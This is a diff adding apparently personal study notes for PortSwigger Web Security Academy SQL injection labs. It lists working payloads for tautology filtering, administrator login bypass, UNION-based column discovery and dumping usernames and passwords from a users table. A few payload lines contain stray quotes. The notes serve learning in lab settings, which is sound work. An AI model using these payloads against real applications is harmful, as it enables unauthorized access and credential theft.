@@ -1,0 +1,49 @@
+
+
+https://portswigger.net/web-security/all-labs
+
+
+	<SQL Injection>
+	
+	
+	-SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+		
+		select * from customers where city = 'london'					|| show only city 
+		select * from customers where city = 'london' or 1=1--			|| or 1=1-- will return all city which means true
+		
+		w3schoolos.com/filter?category=Pets'+or+1=1--					|| will return all categories
+		
+		
+	- SQL injection vulnerability allowing login bypass
+		 
+		 modify the username parameter and giving it the value: administrator'-- 
+		 
+	
+	- SQL injection UNION attack (determining the number of columns returned by the query)
+	
+		return null values datab using this '+UNION+SELECT+NULL,NULL--    || here two columns are exist.. NULL can be 1,2,3 or more   
+		
+		
+	- SQL injection UNION attack (finding a column containing text)
+		Lifestyle'+union+select+null,null',null--					 	  || first determine the number of colums using NULL, check for respose  
+		Lifestyle'+union+select+'12345',null','bangladesh'--		 	  || then replace NULL using string or integer values, check for respose 		
+		
+		
+	- SQL injection UNION attack, retrieving multiple values in a single column	
+		Lifestyle'+UNION+SELECT+NULL,NULL--
+		Lifestyle'+UNION+SELECT+'ABCD','EFGH'--
+		Lifestyle'+UNION+SELECT+username,+password+FROM+users-- 
+		
+		Lifestyle'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+		Lifestyle'+UNION+SELECT+BANNER,+NULL+FROM+v$version--		
+		
+	
+	
+	<Blind SQL Injection>
+	
+	Content Based Blind SQL Injection  
+	Time Based Blind SQL Injection
+	
+	
+	
+	
